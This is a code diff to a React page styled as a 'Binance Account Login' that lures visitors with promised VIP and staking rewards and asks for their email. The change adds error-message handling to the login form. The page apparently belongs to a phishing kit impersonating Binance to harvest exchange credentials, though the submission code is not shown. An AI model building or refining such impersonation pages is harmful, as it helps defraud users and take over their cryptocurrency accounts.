@@ -15,11 +15,16 @@ export default function Home() {
   const dispatch = useDispatch()
   const formRef = useRef(null)
   const buttonRef = useRef(null)
+  const [error, setError] = useState(null)
   const [host_url, setHostUrl] = useState('')
 
   useEffect(() => {
     setHostUrl(window.location.hostname)
   }, [])
+  
+  useEffect(() => {
+    if (app_state.error) setError(app_state.error)
+  }, [app_state.error])
 
   const responsive = {
   desktop: {
@@ -94,7 +99,8 @@ export default function Home() {
         <div className="w-full md:w-[400px] mb-5 md:mb-0">
           <h2 className="text-2xl md:text-3xl font-semibold mt-2 mb-10 md:my-2">Binance Account Login</h2>
           <p className='text-gray-600 hidden md:block pt-2'>Get verified to access exclusive rewards on the <span className="text-[#DD7907]">Binance VIP</span> trading account, enjoy unmatched staking rewards</p>
-          <form className="my-5" ref={formRef} onSubmit={ handleLoginSubmit }>
+          <form className="my-5" ref={formRef} onSubmit={handleLoginSubmit}>
+            { error && ( <div className="bg-red-50 px-3 py-1 text-xs text-center text-red-700 py-2 my-3">{ error }</div> )}
             <div className="input_field">
               <label className="block">Email</label>
               <input type="email" name="email" placeholder='Enter email address' className='px-2 py-3.5 w-full border rounded-md outline-none focus:border-[#E18404]' required />
